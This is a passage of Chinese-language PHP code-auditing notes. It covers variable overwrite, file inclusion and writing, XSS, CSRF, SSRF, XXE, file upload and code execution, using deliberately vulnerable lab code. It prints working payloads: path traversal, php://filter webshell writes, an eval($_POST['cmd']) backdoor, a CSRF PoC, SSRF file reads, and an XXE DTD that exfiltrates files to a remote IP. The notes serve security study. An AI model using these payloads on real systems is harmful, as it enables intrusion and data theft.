var_dump(extract($_GET)); // ?name=hack&school=fuckoff_ccp ， name和school的值会被覆盖
// var_dump(extract($_GET,EXTR_SKIP)); //参数加上 EXTR_SKIP 时便不会被覆盖
echo "</br>";
echo $name;
echo "</br>";
echo $shcool;
```

<img src=".\图片\Snipaste_2023-04-08_22-33-53.png" alt="Snipaste_2023-04-08_22-33-53" style="zoom:80%;" />

### parse_str

`parse_str` 可以**将字符串解析成多个变量**

示例1：

```php
<?php
$str = "name=zf1yolo&age=23";
@parse_str($str);
echo $name." 年龄是 ".$age;  // zf1yolo 年龄是 23
```

示例2：

```php
<?php
header("Content-Type:text/html;charset=utf-8");

$name="moonsec";
$age=18;
@parse_str($_GET['var']);
echo $name." 年龄是 ".$age;
```

<img src=".\图片\Snipaste_2023-04-08_22-54-36.png" alt="Snipaste_2023-04-08_22-54-36" style="zoom:67%;" />

只能修改  ?var=age=20&**var=name=admin**  后面参数`var=name=admin`的值

### mb_parse_str

与  `parse_str` 类似

示例1：

```php
<?php
$str = 'email=moonsec@moonsec.com&name=moonsec&age=18';
mb_parse_str($str, $result);
print_r($result);  // Array ( [email] => moonsec@moonsec.com [name] => moonsec [age] => 18 )
```

示例2：

```php
<?php
$name="moonsec";
$age=18;
@mb_parse_str($_GET['var']);//var=name=admin&var=age=20
echo $name." 年龄是 ".$age;
```

<img src=".\图片\Snipaste_2023-04-08_22-59-52.png" alt="Snipaste_2023-04-08_22-59-52" style="zoom: 80%;" />

### 全局变量覆盖

示例：

```php
<?php
$name="moonsec";
foreach (array('_COOKIE', '_POST', '_GET') as $_request) { //遍历参数
    //$_GET key name value admin
    foreach ($$_request as $_key => $_value) { //遍历key和value 例如 $_GET['name']='admin'
        $$_key = addslashes($_value); //$name='admin' 而且将值进行addslashes过滤
    }
}
echo $name;  //传入过来的值会被覆盖。     // admin\'
```

```http
http://127.0.0.1:8081/www.phpsec.com/var/var.php?name=admin'
```

<img src=".\图片\Snipaste_2023-04-08_23-07-55.png" alt="Snipaste_2023-04-08_23-07-55" style="zoom:80%;" />

## 文件操作漏洞

文件操作包括文件包含、文件读取、文件删除、文件修改以及文件上传。

 可控参数的值传入操作函数内没有进行过滤，有可能会造成严重的漏洞。

php文件操作相关函数：  [PHP: 文件系统 - Manual](https://www.php.net/manual/zh/book.filesystem.php)

### 文件读取

相关函数：

```php
fopen()
file_get_contents()
fread()
fgets()
fgetss()
file()
fpassthru()
parse_ini_file()
readfile()
```

示例：`file_get_contents()` 函数

```php
<?php

if(isset($_GET['url'])){
    echo file_get_contents("../data/".$_GET['url']);
}
```

读取当前 data 目录的 ver.txt : 

```http
http://127.0.0.1:8081/www.phpsec.com/page/file_get_contents.php?url=ver.txt
```

越级读取：

```http
127.0.0.1:8081/www.phpsec.com/page/file_get_contents.php?url=../config/db.php
```

<img src=".\图片\Snipaste_2023-04-08_23-19-13.png" alt="Snipaste_2023-04-08_23-19-13" style="zoom:67%;" />

### 文件写入

`file_put_contents` 函数例子：

```php
//file_put_contents1.php
<?php
highlight_file(__FILE__);
$filename=$_GET['filename'];
if(isset($filename)){
    $content=$_GET['content'];
    file_put_contents("../data/".$filename,$content);
}
```

任意文件写入： 

```http
http://127.0.0.1:8081/www.phpsec.com/page/file_put_contents1.php?filename=phpinfo.php&content=%3C?php%20phpinfo();
```

<img src=".\图片\Snipaste_2023-04-08_23-40-34.png" alt="Snipaste_2023-04-08_23-40-34" style="zoom:80%;" />

#### 文件写入技巧

```php
//file_put_contents2.php
<?php
highlight_file(__FILE__);
$filename=$_GET['filename'];
if(isset($filename)){
    $content=$_GET['content'];
    file_put_contents($filename,'<?php exit();'.$content);

}
```

**可以使用base64和rot13进行绕过写入文件：**

base64解码的时候是4字节->3字节，对于不可识别的字符会跳过，对于`<?php exit();`中，可以识别的只有`phpexit`，一共 7个字节，因此**在前面加个一个字节**，然后再加上 base64 加密的结果就可以了。

```http
filename=php://filter/convert.base64-decode/resource=zf1yolo.php&content=zPD9waHAgcGhwaW5mbygpOw==
```

```
PD9waHAgcGhwaW5mbygpOw==                 // base64解码后为<?php phpinfo();
```

成功写入：

<img src=".\图片\Snipaste_2023-04-09_03-29-43.png" alt="Snipaste_2023-04-09_03-29-43" style="zoom:80%;" />

**rot13 在开启短标签的时候会失败：**

```http
filename=php://filter/string.rot13/resource=moon1.php&content=<?cuc cucvasb();?>
```

```
<?cuc rkvg();<?php phpinfo();?> //开启短标签 导致 少了一个?> 导致php运行时出错
开启短标签之后除了<?php ?>，可使用更灵活的调用方法
<? /*程序操作*/ ?>
<?=/*函数*/?>
```

详细     https://ego00.blog.csdn.net/article/details/113094542

### 文件下载

示例：

```php
//download.php
<?php
include '../function/function.php';
if(!$_GET['file']){
    die("error");
}
download($_GET['file']);
```

```php
//function.php
function download($file_name){
    header("Content-type:text/html;charset=utf-8");
// $file_name="cookie.jpg";
    //$file_name="圣诞狂欢.jpg";
//用以解决中文不能显示出来的问题
    $file_name=iconv("utf-8","gb2312",$file_name);
    $file_sub_path=$_SERVER['DOCUMENT_ROOT']."/www.phpsec.com/data/";
    echo $file_sub_path."<br>";
    $file_path=$file_sub_path.$file_name;
//首先要判断给定的文件存在与否
    if(!file_exists($file_path)){
        echo "没有该文件";
        return ;
    }
    $fp=fopen($file_path,"r");
    $file_size=filesize($file_path);
//下载文件需要用到的头
    Header("Content-type: application/octet-stream");
    Header("Accept-Ranges: bytes");
    Header("Accept-Length:".$file_size);
    Header("Content-Disposition: attachment; filename=".$file_name);
    $buffer=1024;
    $file_count=0;
//向浏览器返回数据
    while(!feof($fp) && $file_count<$file_size){
        $file_con=fread($fp,$buffer);
        $file_count+=$buffer;
        echo $file_con;
    }
    fclose($fp);
}
```

触发以下url便可以任意文件下载：

```http
http://127.0.0.1:8081/www.phpsec.com/page/download.php?file=../page/download.php
```

### 目录遍历

示例：

```php
//tree.php
<?php
include '../function/function.php';
$dir = isset($_GET['dir'])?input($_GET['dir']):"./";
if($dir){
    loopDir($dir);
}
```

```php
//function.php
function loopDir($dir)
{
    $handle = opendir($dir);
    while (false !== ($file = readdir($handle))) {
        if ($file != '.' && $file != '..') {
            echo $file . '<br/>';
            if (filetype($dir . '/' . $file) == 'dir') {
                loopDir($dir . '/' . $file);
            }
        }
    }
    closedir($handle);
```



目录遍历 ：   `?dir=../data`

<img src=".\图片\Snipaste_2023-04-09_03-49-28.png" alt="Snipaste_2023-04-09_03-49-28" style="zoom:80%;" />

### 文件包含

程序员在开发过程中会把经常使用的函数写好封装在一个单独的文件中，在使用时直接调用该文件，在调用文件的过程一 般称为包含。

开发时，程序员希望代码更加灵活，**通常会将被包含的文件设置为变量**。进行动态调用，虽然提高了灵活性，但是安全性 则大大降低，这样会导致客户端可以调用一个恶意的文件，造成文件包含漏洞。

常见函数：

```php
require() //有错误信息警告退出
include() //错误信息继续执行
包含一次
require_once()
include_once()
```

示例代码如下：

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['local'])){
    include $_GET['local'].".txt"; //magic_quotes_gpc = Off php版本<5.3.4 %00截断 \. .
}elseif (isset($_GET['rce'])){
    //allow_url_fopen = On（是否允许打开远程文件）
    //allow_url_include = On（是否允许include/require远程文件
    include $_GET['rce']; //因为没有限制后缀 可以任意包含、
}
```

#### 本地包含

本地包含利用 可以上传恶意的脚本，进行本地引入加载，**有后缀限制需要判断是否能截断**。

截断条件：

##### 00%截断 

`magic_quotes_gpc = Off` `php版本<5.3` 

```http
http://127.0.0.1:8081/www.phpsec.com/page/include.php?local=../data/x.php%00
http://127.0.0.1:8081/www.phpsec.com/page/include.php?local=../data/x
http://127.0.0.1:8081/www.phpsec.com/page/include.php?local=../data/x.txt%00
```

<img src=".\图片\Snipaste_2023-04-09_04-04-37.png" alt="Snipaste_2023-04-09_04-04-37" style="zoom:80%;" />

##### 路径长度截断

php版本 < 5.2.8 ，linux需要文件名长于4096，windows需要长于256

条件：windows OS，点号需要长于256；linux OS 长于4096

Windows下目录最大长度为256字节，超出的部分会被丢弃； Linux下目录最大长度为4096字节，超出的部分会被丢弃。

```
test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././
```

##### 点号截断

php版本 < 5.2.8 ，linux需要文件名长于4096，windows需要长于256 ，windows OS，点号需要长于256

```
test.txt..................................................................................................................................................................................................................
```

#### 远程包含

allow_url_fopen = On（是否允许打开远程文件） 

allow_url_include = On（是否允许include/require远程文件）  默认情况下 这个是关闭的

在远程服务上 放置可以访问的 php 代码 远程加载即可

```http
include.php?rce=http://XXX.XXX.XXX.XX/php.txt
```

远程包含截断使用  `?、#`       需要转码(`%23`)截断

<img src=".\图片\Snipaste_2023-04-09_04-25-34.png" alt="Snipaste_2023-04-09_04-25-34" style="zoom:67%;" />

#### 包含伪协议

##### fillter、file读取文件源码

```php
php://filter/convert.base64-encode/resource=../data/x.txt
php://filter/read=convert.base64-encode/resource=../data/x.txt
```

<img src=".\图片\Snipaste_2023-04-09_04-28-18.png" alt="Snipaste_2023-04-09_04-28-18" style="zoom:67%;" />

```http
rce=file://D:\phpstudy\WWW\www.phpsec.com\data\x.txt                     file://+绝对路径
```

<img src=".\图片\Snipaste_2023-04-09_04-30-59.png" alt="Snipaste_2023-04-09_04-30-59" style="zoom: 67%;" />

##### data

data细节 https://blog.csdn.net/qq_46091464/article/details/106665358

```php
data://text/plain,<?php phpinfo();?>
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
```

```
PD9waHAgcGhwaW5mbygpOw==          <?php phpinfo();
```

<img src=".\图片\Snipaste_2023-04-09_04-35-52.png" alt="Snipaste_2023-04-09_04-35-52" style="zoom:67%;" />

##### php://input

`php://input` 可以访问请求的原始数据的只读流，将请求的数据当作 php 代码执行。当传入的参数作为文件名打开时，可以 将参数设为php://input，**同时post想设置的文件内容，php执行时会将 post 内容当作文件内容。**

```
GET：?rce=php://input
POST: <?php phpinfo();?>
```

注：当enctype="multipart/form-data"时，php://input 是无效的。

<img src=".\图片\Snipaste_2023-04-09_04-40-04.png" alt="Snipaste_2023-04-09_04-40-04" style="zoom: 67%;" />

##### phar://

需要将 php.ini 的参数 phar.readonly 设置为 off

新建恶意文件，打包成zip文件 用phar访问即可。以下 payload 中 `./` 代表当前目录。

```http
http://127.0.0.1:8081/www.phpsec.com/page/include.php?rce=phar://./php.zip/php.txt
```

<img src=".\图片\Snipaste_2023-04-09_04-45-52.png" alt="Snipaste_2023-04-09_04-45-52" style="zoom:67%;" />

##### zip协议

```
zip://./php.zip%23php.txt
```

详细 https://segmentfault.com/a/1190000018991087



### 文件删除

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['url'])){
    unlink($_GET['url']);
}
```

```http
http://127.0.0.1:8081/www.phpsec.com/page/unlink.php?url=../data/x.php
```

<img src=".\图片\Snipaste_2023-04-09_04-52-02.png" alt="Snipaste_2023-04-09_04-52-02" style="zoom:67%;" />

首先查询数据库 delete * from 某个表 where id='1'; 

删除指定文件 在代码审中 一般漏洞存在于系统重装漏洞等。



### 文件判断漏洞

`file_exists()` 函数检查文件或目录是否存在。 如果指定的文件或目录存在则返回 true，否则返回 false

示例：

```php
<?php
$filename = $_GET['file'];
if(file_exists($filename)){
    echo $filename." exists";
}else{
    echo $filename." no exists";
}
```

file_exists 支持 ../ 跳转目录，例如访问上级目录 `../data/ver.txt` 也支持这样访问

`../data/aaaa/../ver.txt aaaa` 表示一个不存在的目录。这样一样算目录存在

```http
http://127.0.0.1:8081/www.phpsec.com/page/file_exists.php?file=../data/aaaa/../ver.txt
```

<img src=".\图片\Snipaste_2023-04-09_04-56-19.png" alt="Snipaste_2023-04-09_04-56-19" style="zoom:67%;" />

例子 https://www.techug.com/post/php-file_exists-problem/



## XSS

xss漏洞分为三种 分别是 反射型xss、存储型xss、dom型xss 

dom前端的比较多 

把重点放在反射型 和 存储型 在开发中，经常需要往前端输出内容，前端会对这些输出的内容进行处理。 

对输入的内容没有进行有效的过滤，当程序输出结果时，也没有进行过滤 就会造成xss漏洞 

所以在挖掘xss漏洞要关注一些输出函数：

```php
print
print_r
echo
printf
sprintf
die
exit
var_dump
var_export
$_SERVER['PHP_SELF'] //获取当前路径
$_SERVER['HTTP_REFERER'] //获取来源页面
```

反射型xss 直接在页面输出：

```php
$title = $_GET['title'];
echo $title;
echo $_SERVER['PHP_SELF'];
```

防止xss：

```
htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。
预定义的字符是：
& （和号）成为 &
" （双引号）成为 "
' （单引号）成为 '
< （小于）成为 <
> （大于）成为 >
```

```php
<?php
$title=$_GET['title'];
echo htmlspecialchars($title);
```



存储型xss 因为是持久化 一般插入结果 存在数据中。

对输入的参数没有进行有效过滤 插入到数据库中，再查询出来就会存在xss漏洞

```php
<?php
highlight_file(__FILE__);
include '../config/db.php';
include '../function/function.php';
$title = $_GET['title'];
echo $title;
echo "<br>";
echo $_SERVER['PHP_SELF'];


if($_GET['c']=='c'){
    $sql="insert into news(title)values('$title')"; //插入XSS到数据库里
    if ($result = $conn->query($sql)) {
        echo "success";
    }
}

$id = isset($_GET['id'])?$_GET['id']:1;

if ($result = $conn->query("select * from news where id='$id'")) {  //取出XSS语句展示到页面
    while ($row = $result->fetch_assoc()) {
        echo "<pre>";
        var_dump($row);
        echo "</pre>";
    }die(mysqli_error($conn));
}
```

## CSRF

### 示例代码

login.php

```php
<?php
header("Content-Type:text/html;charset=utf-8");
session_start();
include '../config/db.php';
include '../function/function.php';

foreach (array('_COOKIE', '_POST', '_GET') as $_request) { //遍历参数
    //$_GET key name value admin
    foreach ($$_request as $_key => $_value) { //遍历key和value 例如 $_GET['name']='admin'
        $$_key = addslashes($_value); //$name='admin' 而且将值进行addslashes过滤
    }
}

if($c=="check"){
    if (!$result = $conn->query("select * from users where username='$username'")) {
        die(mysqli_error($conn));
    }
    if($result){
        $row=$result->fetch_array();
        if($password==$row['password']){
            $_SESSION['username']=$row['username'];
            header("Location: index.php");
        }else{
            echo "账号或密码不对";
        }
    }else{
        echo "账号或密码不对";
    }
}
?>
<div align="center">
    <form action="?c=check" method="post">
        用户名:<input name="username" type="text"></br>
        密&nbsp码:<input name="password" type="password"></br>
        <input type="submit" value="登录">
    </form>

</div>
```

index.php

```php
<?php
header("Content-Type:text/html;charset=utf-8");
include '../config/db.php';
include '../function/function.php';

foreach (array('_COOKIE', '_POST', '_GET') as $_request) { //遍历参数
    //$_GET key name value admin
    foreach ($$_request as $_key => $_value) { //遍历key和value 例如 $_GET['name']='admin'
        $$_key = addslashes($_value); //$name='admin' 而且将值进行addslashes过滤
    }
}
session_start();
if(!$_SESSION['username']){
    header("Location: login.php");
}
echo "<p>当前用户【$_SESSION[username]】 | <a href='?c=logout'>退出</a></p> ";
?>
<?php

if($_SESSION['username']=='admin'){
       echo <<<EOT

<h3>添加用户</h3>
<form method="post" action="?c=add">
账号：<input type="text" name="username" ><br>
密码：<input type="password" name="password" ><br>
<!--<input type="hidden" name="token" value="11234404400a">-->
<input type="submit" value="确定">
</form>
EOT;
}
if($c=='add'){
    if(isset($username) && isset($password)){
        echo "<br>".$username."  ".$password;
        if (!$result = $conn->query("insert into users (id,username,password) values(null,'$username','$password')")) {
            die(mysqli_error($conn));
        }else{
            echo "添加用户成功";
        }
    }

}
if($c=='logout'){
    $_SESSION = array();
    if(isset($_COOKIE[session_name()])){  //判断客户端的cookie文件是否存在,存在的话将其设置为过期.
        setcookie(session_name(),'',time()-1,'/');
    }
    session_destroy();  //清除服务器的sesion文件
    header("Location: login.php");
}
```



这个代码意思还是先登录才能执行crud的一些操作，假如我们直接找到了登录后才能执行的crud的数据包，把这个数据包再构造成一段html代码引诱管理员去访问，那么这个crud操作将可能成功。

用brup生成csrf的html页面：

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1:8081/www.phpsec.com/member/index.php?c=add" method="POST">
      <input type="hidden" name="username" value="fuckccp" />
      <input type="hidden" name="password" value="123456" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

引诱管理员触发后将添加一个用户  fuckccp:123456。我们这里由于代码作者的原因导致代码有bug，只能添加 admin:密码 的用户，不过这与本示例csrf无关可忽略不计。

### 防御

加上防 csrf 的 token，以下是一种方法：

表单加上 `<!--<input type="hidden" name="token" value="11234404400a">-->  `

```html
<form method="post" action="?c=add">
账号：<input type="text" name="username" ><br>
密码：<input type="password" name="password" ><br>
     <input type="hidden" name="token" value="11234404400a">
<input type="submit" value="确定">
</form>
```



## SSRF

SSRF(Server-side Request Forge, **服务端请求伪造**)，一般是由于服务端提供了从其他服务器获取数据但没有对地址或 协议等进行过滤或限制造成的漏洞，通常利用SSRF进行内网探测等。

关注一下函数 如果传入的参数 没有过滤 容易造成 ssrf：

```php
fopen()
file_get_contents()、
curl()、
fsocksopen()
```

ssrf支持的协议：

```
http/https：主要用来探测内网服务，根据响应的状态判断内网端口及服务，可以结合如Struts2的RCE来实现攻击；
file：读取服务器上的任意文件；
dict：查看安装软件版本信息、端口，操作内网Redis服务等；
gopher：能够将所有操作转换成数据流，并将数据流一次发送出去，可以用来探测内网的所有服务的所有漏洞，可利用来攻击
Redis和PHP-FPM；
ftp/ftps：FTP匿名访问、爆破；
tftp：UDP协议扩展，发送UDP报文；
imap/imaps/pop3/smtp/smtps：爆破邮件用户名密码；
telnet：SSH/Telnet匿名访问及爆破；
```

漏洞代码如下：

```php
<?php
header("Content-Type:text/html;charset=utf-8");
highlight_file(__FILE__);
if(isset($_GET['url'])){
    $curlobj = curl_init();//初始化一个cURL会话为curlobj
    curl_setopt($curlobj, CURLOPT_POST, 0); // 设置URL选项
    curl_setopt($curlobj,CURLOPT_URL,$_GET['url']);
    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);
    $result=curl_exec($curlobj); // 抓取URL并传递给浏览器
    curl_close($curlobj); // 关闭cURL资源,释放系统资源
    echo $result;
}

//file_get_contents() demo
/*$url = $_GET['url'];
echo file_get_contents($url);*/

//fsocksopen()
function GetFile($host,$port,$link)
{
    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);
    if (!$fp)
    {
        echo "$errstr (error number $errno) \n";
    }
    else
    {
        $out = "GET $link HTTP/1.1\r\n";
        $out .= "Host: $host\r\n";
        $out .= "Connection: Close\r\n\r\n";
        $out .= "\r\n";
        fwrite($fp, $out);
        $contents='';
        while (!feof($fp))
        {
            $contents.= fgets($fp, 1024);
        }
        fclose($fp);
        return $contents;
    }
}
/*$url = $_GET['url'];
echo GetFile($url,88,"/");*/
?>
```

### 使用file协议获取文件

```http
http://127.0.0.1:8081/www.phpsec.com/page/ssrf.php?url=file://D:\phpstudy\WWW\www.phpsec.com\page\door.txt
```

<img src=".\图片\Snipaste_2023-04-10_10-24-47.png" alt="Snipaste_2023-04-10_10-24-47" style="zoom:80%;" />

### http协议访问端口

访问外网和内网 

使用nc -lvnp 88 监听端口

```
访问远程ip
url=http://192.168.0.108:88
返回信息
nc -lvnp 88
listening on [any] 88 ...
connect to [192.168.0.108] from (UNKNOWN) [192.168.0.106] 62101
GET / HTTP/1.1
Host: 192.168.0.108:88
Accept: */*
```

### dict协议

可以使用 dict协议访问开放端口

```
url=dict://127.0.0.1:6379/info
```

详细 https://www.jianshu.com/p/e0f6ef3ea833



## XXE

简单来说，XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命 令执行、内网端口探测、攻击内网网站等危害。 条件 libxml2.9.0以后，默认不解析外部实体 防御 `libxml_disable_entity_loader(true)`

关注函数：

```php
new DOMDocument() //DOMDocument :: loadXML() // 从字符串加载xml文档
new SimpleXMLElement() //SimpleXMLElement类标识xml文档中的元素
simplexml_load_string() //simplexml_load_string() // 接受格式正确的XML字符串，并将其作为对象返回。
```

漏洞代码：

```php
<?php
header("Content-Type:text/html;charset=utf-8");
highlight_file(__FILE__);
$data = file_get_contents('php://input');
$xml = simplexml_load_string($data);
echo $xml->name;
```

### 回显

读取hosts或者/etc/passwd

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts" >]>
<root>
<name>&xxe;</name>
</root>
```

伪造协议读取文件

```xml
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE xxe[
<!ELEMENT name ANY>
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=xxe.php">]>
<root>
<name>&xxe;</name>
</root>
```

```
返回
PD9waHANCiRkYXRhID0gZmlsZV9nZXRfY29udGVudHMoJ3BocDovL2lucHV0Jyk7DQokeG1sID0gc2ltcGxleG1sX2xvYWRfc
```

### 无回显

可以使用外带数据通道提取数据，先使用 `php://filter` 获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器 

把读取的内容通过 test.dtd ：

```xml
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE ANY [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=xxe.php">
<!ENTITY % dtd SYSTEM "http://192.168.0.108/test.dtd">
%dtd;
%send;
]>
```

远程vps：

```dtd
<!ENTITY % all
 "<!ENTITY &#x25; send SYSTEM 'http://192.168.0.106/?file=%file;'>"
>%all;
```

接受数据文件：

```php
<?php
if($_GET['file']){
 file_put_contents("test.txt", $_GET['file']);
}
?>
```



## 文件上传

### 原理

文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力，这种攻击方式 是最直接和有效的,文件上传本身是没问题的，有问题的是文件上传后，服务器怎么处理，解析文件。通过服务器的处理 逻辑做的不够安全，则会导致上传漏洞。

### 漏洞条件

- 文件可上传

- 知道文件上传路径

- 上传文件可以被访问
- 上传文件可以被执行



全局数组 `$_FILES`

```
$_FILES['File']['name'] 显示客户端文件的原名称。
$_FILES['File' ]['type']文件的MIIME类型，例如"image/gif" 。
$_FILES['File']['size']已 上传文件的大小，单位为字节。
$__FILES['File' ]['tmp___name'] 储存的临时文件名，一 般是系统默认。
$_FILES['File']['error'] 该文件上传相关的错误代码。以下为不同代码代表的意思:

0;文件上传成功。
1;超过了文件大小php.ini中即系统设定的大小。
2;超过了文件大小MAX_FILE _SIZE 选项指定的值。
3;文件只有部分被上传。
4;没有文件被上传。
5;上传文件大小为0。
```

关注函数：

```php
move_uploaded_file
copy
```

相关函数：

```php
move_uploaded_file(file, newloc)函数将上传的文件移动到新位置。
strtolower()函数把字符串转换为小写。
trim()函数移除字符串两侧的空白字符或其他预定义字符。
strrchr()函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。
str ireplace() 函数替换字符串中的一些字符(不区分大小写)
getimagesize()函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回FALSE并产生一条E_ WARNING级的错误信
息。
exif jimagetype()读取一个图像的第一个字节并 检查其签名。
substr()函数返回字符串的一部分。
fopen()函数打开文件或者URL。
fread()函数读取文件(可安全用于二进制文件)。
fwrite()函数写入文件(可安全用于二进制文件)。
```

在代码审计中快速定位 move_uploaded_file 函数 审计文件名、后缀名、文件目录是否可控。 

文件上传漏洞主要审计地方 后缀可控 是否能绕过黑白名单。 

文件参数可控 %00截断文件名。

### 代码示例

```php
<?php
//highlight_file(__FILE__);
if($_FILES){ //获取上传数组
$allowed = array("gif", "png", "jpg"); //白名单 数组
$temp = explode(".", $_FILES["file"]["name"]);//1.jpg 0->1 1->jpg
$extension = end($temp); //jpg 后缀名
echo $_FILES["file"]["size"]; //图片的大小

if ((($_FILES["file"]["type"] == "image/gif") //判断 上传的类型是不是在这里面的图片类型
        || ($_FILES["file"]["type"] == "image/jpeg")
        || ($_FILES["file"]["type"] == "image/jpg")
        || ($_FILES["file"]["type"] == "image/pjpeg")
        || ($_FILES["file"]["type"] == "image/x-png")
        || ($_FILES["file"]["type"] == "image/png"))
    && ($_FILES["file"]["size"] < 2048000) //判断图片小于  2048000
    /*&& in_array($extension, $allowed)*/){ //白名单判断 后缀名是否在 $allowed 数组里面

    if($_FILES["file"]["error"] > 0){

        echo "错误 : " . $_FILES["file"]["error"] . "<br>";
    }

    echo "上传的文件名: " . $_FILES["file"]["name"] . "<br>";
    echo "文件类型: " . $_FILES["file"]["type"] . "<br>";
    echo "文件大小: " . $_FILES["file"]["size"] . "<br>";
    echo "文件临时存放位置:" . $_FILES["file"]["tmp_name"] . "<br>";
    $path=isset($_GET['path'])?$_GET['path']:"../upload/";
    if(file_exists($path . $_FILES["file"]["name"])){

        echo $_FILES["file"]["name"] . "文件已经存在。";
    }
    else{
        move_uploaded_file($_FILES["file"]["tmp_name"], $path. $_FILES["file"]["name"]);
        echo "文件存储在: " .$path. $_FILES["file"]["name"];
    }
}else{

    echo "上传出错不是图片类型";
}

}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>文件上传</title>
</head>
<body>
<form action="upload.php" method="post" enctype="multipart/form-data">
    <label for="file">文件名: </label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" value="提交">
</form>
</body>
</html>
```

获取上传文件名 获取后缀名 检测 http 文件头是否为图片 通过后 判断大小图片<2048000 白名单内 上传没出错 再到 move_uploaded_file 将临时文件移动到指定目录中。

这份代码是不存在漏洞的。 

想让它存在上传 漏洞 可以删掉 && in_array($extension, $allowed) 这样就不会进行后缀判断。 就可以上传恶意的php后门文件。 

详细 https://blog.csdn.net/qq_34640691/article/details/109578056



## 代码执行

在WEB中，PHP代码执行是指应用程序过滤不严，用户通过http请求将代码注入到应用中执行。

代码注入的两个条件 

1）程序中含有可以执行PHP代码的函数或语言结构； 

2）传入该函数或语言结构的参数是客户端可以控制的（可以直接修改或造成影响），且应用程序过滤不严。

在审计中关注的函数：

```php
eval
assert
preg_replace
call_user_func
call_user_func_array
create_function
preg_replace_callback
$a($b)函数
array_map
array_filter
usort() / uasort()
```

### eval

eval() 函数把字符串按照 PHP 代码来计算。 该字符串必须是合法的 PHP 代码，且必须以分号结尾。 

如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。

最典型使用就是后门一句话：

```php
<?php eval($_POST['cmd']);?>
```

正常用法是在字符串中：

```php
<?php
$str = $_GET['str'];
eval("$str;");  //字符串里面要用分号
```

用法：

```
eval.php?str=phpinfo()
eval.php?str=phpinfo(); //可以用分号
eval.php?str=${phpinfo()} //也可以使用${} 等价于 "${phpinfo()}" 在字符串解析变量 ${}
```

```php
<?php
$m=123;
$str="${m}"; // 等价于 $str="$m"
echo $str;    // 123
```

### assert

assert()功能是判断一个表达式是否成立，返回true or false，重点是函数会执行此表达式。

如果表达式为函数如 `assert (“echo(1)”)`，则会输出1，而如果 `assert(“echo 1;”)` 则不会有输出。

assert把整个字符串参数当php代码执行，assert在php中被认为是一个函数

```php
<?php
@assert($_GET['x']);
```

### preg_replace

preg_replace 函数执行一个正则表达式的搜索和替换。

#### 语法

```php
mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )
//搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。
```

参数说明：

```
$pattern: 要搜索的模式，可以是字符串或一个字符串数组。
$replacement: 用于替换的字符串或字符串数组。
$subject: 要搜索替换的目标字符串或字符串数组。
$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。
$count: 可选，为替换执行的次数。
```

返回值：

如果 subject 是一个数组， preg_replace() 返回一个数组， 其他情况下返回一个字符串。

如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。

#### 审计

preg_replace 使用 /e 模式 导致代码可以被执行 

审计 preg_replace 是否带有/e

```php
<?php
header("Content-Type:text/html;charset=utf-8");
highlight_file(__FILE__);
$str= $_GET['str'];
preg_replace('/(.*)/e','\\1',$str); //第一个参数是正则 存/e \\1是php中的反向引用 在PHP7以上版本不再支持\e修饰符
```

```http
http://127.0.0.1:8081/www.phpsec.com/code/preg_replace.php?str=phpinfo();
```

### call_user_func

call_user_func ： 把第一个参数作为回调函数调用

说明：`call_user_func(callable $callback, mixed ...$args): mixed`

第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。

<img src=".\图片\Snipaste_2023-04-10_11-27-18.png" alt="Snipaste_2023-04-10_11-27-18" style="zoom:80%;" />

### call_user_func_array

call_user_func_array ： 调用回调函数，并把一个数组参数作为回调函数的参数。

说明：`mixed call_user_func_array ( callable $callback , array $param_arr )`

把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。

<img src=".\图片\Snipaste_2023-04-10_11-31-22.png" alt="Snipaste_2023-04-10_11-31-22" style="zoom:80%;" />

### create_function

